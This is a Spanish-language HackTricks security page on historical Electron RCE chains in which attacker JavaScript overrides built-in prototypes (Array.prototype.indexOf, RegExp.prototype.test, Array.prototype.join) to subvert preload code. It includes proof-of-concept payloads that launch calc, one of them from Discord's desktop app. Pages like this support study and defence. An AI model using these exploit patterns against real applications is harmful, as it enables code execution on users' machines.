# RCE en Electron mediante código preload con contextIsolation

{{#include ../../banners/hacktricks-training.md}}

Estas son **cadenas históricas** en las que el código preload compartía intrínsecos de JavaScript o API privilegiadas con contenido del renderer controlado por un atacante. Con context isolation habilitado, preload y la página suelen tener entornos de JavaScript separados, por lo que las modificaciones de prototipos en la página no afectan automáticamente a los objetos de preload. Valida la cadena con la versión exacta de Electron y la implementación del bridge.<sup>[[3]](#references)</sup>

## Example 1

Ejemplo de [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Este código abre enlaces http(s) con el navegador predeterminado:

![RCE de Electron mediante código preload con contextIsolation - Example 1: Este código abre enlaces http(s) con el navegador predeterminado](<../../images/image (768).png>)

En la aplicación histórica afectada, una navegación a un archivo local, como `file:///C:/Windows/System32/calc.exe`, podía llegar a una ruta de ejecución del SO; `SAFE_PROTOCOLS.indexOf` estaba pensado para impedirlo.

Por lo tanto, un atacante podía inyectar este código JS mediante XSS o una navegación arbitraria a una página:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Como la llamada a `SAFE_PROTOCOLS.indexOf` siempre devolverá 1337, el atacante puede evadir la protección y ejecutar calc. Exploit final:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Consulta las diapositivas originales para encontrar otras formas de ejecutar programas sin que aparezca una solicitud de permisos.<sup>[[1]](#references)</sup>

La cadena histórica de Discord también consideró la carga mediante `file://127.0.0.1/electron/rce.jar` al estilo UNC como otra posible vía de ejecución; valida que sea accesible en la versión exacta de Windows/Electron.<sup>[[2]](#references)</sup>

## Ejemplo 2: RCE en la aplicación Discord

Ejemplo de [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

Al revisar los scripts preload, descubrí que Discord expone la función que permite llamar a algunos módulos permitidos mediante `DiscordNative.nativeModules.requireModule('MODULE-NAME')` desde la página web.\
Aquí no pude usar directamente módulos que permiten RCE, como el módulo _child_process_, pero **encontré un código que permite lograr RCE sobrescribiendo los métodos integrados de JavaScript** e interfiriendo con la ejecución del módulo expuesto.

A continuación se muestra el PoC. Pude confirmar que la aplicación **calc** **se abre** cuando **llamo a la función `getGPUDriverVersions`**, definida en el módulo llamado "_discord_utils_", desde devTools, mientras **sobrescribo `RegExp.prototype.test` y `Array.prototype.join`**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

La función `getGPUDriverVersions` intenta ejecutar el programa utilizando la biblioteca "_execa_", como se muestra a continuación:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Normalmente, _execa_ intenta ejecutar "_nvidia-smi.exe_", especificado en la variable `nvidiaSmiPath`; sin embargo, debido a la sobrescritura de `RegExp.prototype.test` y `Array.prototype.join`, **el argumento se reemplaza por "**_**calc**_**" durante el procesamiento interno de _execa**_**.

En concreto, el argumento se reemplaza al influir en las rutas de resolución de comandos y procesamiento de argumentos del parser histórico de `cross-spawn`.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: Abusar de la falta de aislamiento de contexto - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [RCE en la aplicación de escritorio de Discord](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Aislamiento de contexto](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [Revisión del parser de `node-cross-spawn` y rutas exactas usadas por la cadena (líneas 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
